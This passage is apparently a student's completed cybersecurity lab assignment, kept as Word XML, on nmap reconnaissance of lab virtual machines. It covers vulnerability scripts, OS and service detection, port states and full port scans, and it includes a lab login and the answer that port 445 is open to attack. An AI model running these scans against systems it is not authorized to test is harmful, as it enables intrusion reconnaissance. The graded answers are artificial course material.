      </w:r>
      <w:r w:rsidR="00BF1904">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t>directory and explore the scripts that can be used to scan vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71278DAB" w14:textId="3DACA18F" w:rsidR="002F4107" w:rsidRDefault="002F4107" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">What is the file extension of these scripts? </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BEC76A" w14:textId="4BA2EAFA" w:rsidR="00DC0AA3" w:rsidRPr="00DC0AA3" w:rsidRDefault="00DC0AA3" w:rsidP="00DC0AA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.nse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2B44EE" w14:textId="441D6085" w:rsidR="00BB65E2" w:rsidRDefault="0075785B" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Select three scripts. S</w:t>
      </w:r>
      <w:r w:rsidR="00BB65E2">
        <w:t xml:space="preserve">earch </w:t>
      </w:r>
      <w:r w:rsidR="002F4107">
        <w:t>and provide the purpose of selected</w:t>
      </w:r>
      <w:r w:rsidR="00BB65E2">
        <w:t xml:space="preserve"> scripts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360CB724" w14:textId="1156C6FB" w:rsidR="00DC0AA3" w:rsidRDefault="00DC0AA3" w:rsidP="00DC0AA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Whois-ip.nse: uses the WHOIS services and attempts to retrieve information about the IP Address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="491C54D6" w14:textId="7AE644FC" w:rsidR="00DC0AA3" w:rsidRDefault="00DC0AA3" w:rsidP="00DC0AA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Voldermort-info.nse: </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC0AA3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Retrieves cluster and store information from the Voldemort distributed key-value store using the Voldemort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC0AA3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Native Protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C642CEE" w14:textId="2D1CD284" w:rsidR="00DC0AA3" w:rsidRPr="00DC0AA3" w:rsidRDefault="00DC0AA3" w:rsidP="00DC0AA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Telnet-encryption.nse: </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC0AA3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Determines whether the encryption option is supported on a remote telnet</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC0AA3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1573C7A3" w14:textId="51C39AB5" w:rsidR="008907BC" w:rsidRPr="00BF1904" w:rsidRDefault="001239B7" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Update nmap </w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t xml:space="preserve">database using  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="0075785B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">  --script-updatedb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BF24E1D" w14:textId="248C2F17" w:rsidR="002F4107" w:rsidRPr="002F4107" w:rsidRDefault="002F4107" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(5</w:t>
      </w:r>
      <w:r w:rsidRPr="002F4107">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BF1904" w:rsidRPr="00BF1904">
        <w:t xml:space="preserve">To learn nmap usage, use </w:t>
      </w:r>
      <w:r w:rsidR="00BF1904" w:rsidRPr="00BF1904">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>man nmap</w:t>
      </w:r>
      <w:r w:rsidR="0075785B">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="0075785B" w:rsidRPr="0075785B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nmap –h</w:t>
      </w:r>
      <w:r w:rsidR="0075785B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCAAC76" w14:textId="00756E85" w:rsidR="001239B7" w:rsidRDefault="001239B7" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Under </w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00BF1904">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>/usr/share/nmap/scripts</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E44F80">
        <w:t xml:space="preserve">type: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ls | grep vuln </w:t>
      </w:r>
      <w:r w:rsidRPr="001239B7">
        <w:t>an</w:t>
      </w:r>
      <w:r w:rsidR="00E44F80">
        <w:t xml:space="preserve">d identify the scripts with vuln </w:t>
      </w:r>
      <w:r w:rsidRPr="001239B7">
        <w:t>string</w:t>
      </w:r>
      <w:r>
        <w:t>. What is the purpose of vulners script</w:t>
      </w:r>
      <w:r w:rsidR="00E44F80">
        <w:t xml:space="preserve"> ?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341DA009" w14:textId="2B28510E" w:rsidR="00C32D5D" w:rsidRPr="00C32D5D" w:rsidRDefault="00C32D5D" w:rsidP="00C32D5D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C32D5D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>For each available CPE the script prints out known vuln</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">erabilities </w:t>
      </w:r>
      <w:r w:rsidRPr="00C32D5D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>and correspondent CVSS scores.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113F2835" w14:textId="433D7923" w:rsidR="00E44F80" w:rsidRDefault="008907BC" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF1904">
        <w:t>Use the following nmap</w:t>
      </w:r>
      <w:r w:rsidR="002F4107">
        <w:t xml:space="preserve"> command and </w:t>
      </w:r>
      <w:r w:rsidR="00E44F80" w:rsidRPr="00B76541">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">attach </w:t>
      </w:r>
      <w:r w:rsidR="00B76541" w:rsidRPr="00B76541">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00E44F80" w:rsidRPr="00B76541">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>screen capture with results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="493E288B" w14:textId="11B5331C" w:rsidR="008907BC" w:rsidRPr="00BF1904" w:rsidRDefault="005E372A" w:rsidP="00E44F80">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6FA6D61D" wp14:editId="3AA2C6E6">
            <wp:extent cx="594360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14:paraId="7F2210A3" w14:textId="1CFA2C03" w:rsidR="002F4107" w:rsidRDefault="002F4107" w:rsidP="008907BC">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t>nmap  --script=vuln</w:t>
      </w:r>
      <w:r>
        <w:t>ers</w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t xml:space="preserve">  10.0.2.9    (</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">replace </w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t>IP address</w:t>
      </w:r>
      <w:r w:rsidR="00E44F80">
        <w:t xml:space="preserve"> with </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">respective </w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t xml:space="preserve">target </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A64698" w14:textId="6CE809D3" w:rsidR="008907BC" w:rsidRDefault="002F4107" w:rsidP="002F4107">
      <w:pPr>
        <w:ind w:left="4320"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t>machine</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> address- Windows 7</w:t>
      </w:r>
      <w:r w:rsidR="008907BC" w:rsidRPr="00BF1904">
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D882C0" w14:textId="1F34150A" w:rsidR="002F4107" w:rsidRPr="00650FEE" w:rsidRDefault="00650FEE" w:rsidP="00123EC6">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00650FEE">
        <w:t>Attacks are planned on a specific OS version and build or kernel. During recon time attackers find OS version and build of the victim machines. Different tools can be used to find these information</w:t>
      </w:r>
      <w:r w:rsidRPr="00650FEE">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r w:rsidR="00887576">
        <w:t>Explore</w:t>
      </w:r>
      <w:r w:rsidR="00B915A3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B915A3" w:rsidRPr="00650FEE">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>man nmap</w:t>
      </w:r>
      <w:r w:rsidR="00B915A3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00887576">
        <w:t xml:space="preserve">to learn the usage of nmap command </w:t>
      </w:r>
      <w:r w:rsidR="00B915A3">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="00887576">
        <w:t xml:space="preserve">provide </w:t>
      </w:r>
      <w:r w:rsidR="00887576" w:rsidRPr="00650FEE">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a screen capture of the nmap command with respective options</w:t>
      </w:r>
      <w:r w:rsidR="005C5161" w:rsidRPr="00650FEE">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> that will:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EDBA4D0" w14:textId="769F338C" w:rsidR="00887576" w:rsidRDefault="005C5161" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Display o</w:t>
      </w:r>
      <w:r w:rsidR="00887576">
        <w:t>perating system detection - OS detection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5489873B" w14:textId="2AB8FAB5" w:rsidR="00647BA3" w:rsidRDefault="00647BA3" w:rsidP="00647BA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0B45FA39" wp14:editId="49D5D0D3">
            <wp:extent cx="59436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0176D50F" w14:textId="1576B33F" w:rsidR="00887576" w:rsidRDefault="005C5161" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Display </w:t>
      </w:r>
      <w:r w:rsidR="00887576">
        <w:t>Service and version detection</w:t>
      </w:r>
      <w:r w:rsidR="00647BA3">
        <w:t>nmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C721ED" w14:textId="0D9333D7" w:rsidR="00647BA3" w:rsidRDefault="00647BA3" w:rsidP="00647BA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2520"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09572022" wp14:editId="3BC19C3A">
            <wp:extent cx="5934075" cy="2390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14:paraId="6D4EF1EA" w14:textId="63387F9E" w:rsidR="000A0EAE" w:rsidRPr="00647BA3" w:rsidRDefault="000A0EAE" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="000A0EAE">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">Read </w:t>
      </w:r>
      <w:r w:rsidRPr="000A0EAE">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>man nmap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>. Li</w:t>
      </w:r>
      <w:r w:rsidRPr="000A0EAE">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">st and briefly describe the 6 ports states recognized by nmap. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BF268D" w14:textId="5C35AF8C" w:rsidR="00647BA3" w:rsidRPr="00647BA3" w:rsidRDefault="00647BA3" w:rsidP="00647BA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>Open – actively accepting TCP connections, UDP</w:t>
      </w:r>
      <w:r w:rsidR="00CF53B4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> datagrams and SCTP associations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15151740" w14:textId="00C471CF" w:rsidR="00647BA3" w:rsidRDefault="00647BA3" w:rsidP="00647BA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>Closed</w:t>
      </w:r>
      <w:r w:rsidR="00CF53B4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> – accessible but there is no application listening to it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7A91D4" w14:textId="0DDA83FC" w:rsidR="00647BA3" w:rsidRDefault="00647BA3" w:rsidP="00647BA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>Filtered</w:t>
      </w:r>
      <w:r w:rsidR="00CF53B4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Nmap cannot determine whether the port is open due to packet filtering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9A9F6C" w14:textId="266652C7" w:rsidR="00647BA3" w:rsidRDefault="00647BA3" w:rsidP="00647BA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Unfiltered</w:t>
      </w:r>
      <w:r w:rsidR="00CF53B4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> – accessible, but Nmap is unable to determine whether it is open or closed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0552D4DD" w14:textId="02174033" w:rsidR="00647BA3" w:rsidRPr="004172C1" w:rsidRDefault="00647BA3" w:rsidP="004172C1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>Open | Filtered</w:t>
      </w:r>
      <w:r w:rsidR="004172C1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Either open or </w:t>
      </w:r>
      <w:r w:rsidR="004172C1" w:rsidRPr="004172C1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>filtered.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF76169" w14:textId="529ECC98" w:rsidR="00647BA3" w:rsidRPr="00647BA3" w:rsidRDefault="00647BA3" w:rsidP="00647BA3">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>Closed | Filtered</w:t>
      </w:r>
      <w:r w:rsidR="004172C1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> – Either closed or filtered</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531E9F24" w14:textId="51B7A313" w:rsidR="005C5161" w:rsidRDefault="000A0EAE" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Provide a screen capture that demo how to use nmap command to scan </w:t>
      </w:r>
      <w:r w:rsidR="00081F94">
        <w:t xml:space="preserve">all </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ports on victim machine (Windows 7) and displays </w:t>
      </w:r>
      <w:r w:rsidR="00081F94">
        <w:t xml:space="preserve">the state </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r w:rsidRPr="00081F94">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>all ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304C76BF" w14:textId="7B986A5A" w:rsidR="008907BC" w:rsidRDefault="007E03A2" w:rsidP="008907BC">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0F4422F8" wp14:editId="05ADE78B">
            <wp:extent cx="5934075" cy="4486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486275"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC03FDE" w14:textId="77777777" w:rsidR="008907BC" w:rsidRPr="00BF1904" w:rsidRDefault="008907BC" w:rsidP="008907BC"/>
    <w:p w14:paraId="2419B602" w14:textId="70143E8D" w:rsidR="00B90AB1" w:rsidRPr="00BF1904" w:rsidRDefault="00B90AB1" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00BF1904">
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t>( 2 marks)</w:t>
      </w:r>
      <w:r w:rsidRPr="00BF1904">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> After analyzing recon scans, are there any services or potential vulnerabilities you might try to attack?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09684325" w14:textId="418E5BD2" w:rsidR="00B90AB1" w:rsidRPr="00223D66" w:rsidRDefault="00CA5588" w:rsidP="00CA5588">
      <w:pPr>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Port 445</w:t>
      </w:r>
      <w:r w:rsidR="00C614A1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> is open to potential attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A037066" w14:textId="6A7874F8" w:rsidR="00367101" w:rsidRDefault="00367101" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00367101">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>(10 marks)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Scan ports and vulnerable protocols in Windows 10 Clone virtual machine. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15020D75" w14:textId="77777777" w:rsidR="00367101" w:rsidRDefault="00367101" w:rsidP="00367101">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F4ACDFD" w14:textId="40FBC003" w:rsidR="00B51B7C" w:rsidRDefault="005D50C2" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Now </w:t>
      </w:r>
      <w:r w:rsidR="00B51B7C">
        <w:t xml:space="preserve">to connect Windows 10 Clone virtual machine to this network configure its network settings as NATNetwork and Allow all VMs. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="633B32C9" w14:textId="77777777" w:rsidR="00B51B7C" w:rsidRDefault="00B51B7C" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Start </w:t>
      </w:r>
      <w:r w:rsidR="005D50C2">
        <w:t xml:space="preserve">Windows 10 </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Clone </w:t>
      </w:r>
      <w:r w:rsidR="005D50C2">
        <w:t xml:space="preserve">virtual machine </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">as: </w:t>
      </w:r>
      <w:r w:rsidRPr="00B51B7C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ITSCstudent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with password: </w:t>
      </w:r>
      <w:r w:rsidRPr="00B51B7C">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OSExploits</w:t>
      </w:r>
      <w:r w:rsidR="005D50C2">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13125FD8" w14:textId="4407803F" w:rsidR="00111EFD" w:rsidRDefault="00B51B7C" w:rsidP="0006153A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="44"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Verify connectivity between Kali2020 and Windows 10 Clone</w:t>
      </w:r>
      <w:r w:rsidR="005D50C2">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">virtual machines. You should be able to ping Kali2020 </w:t>
      </w:r>
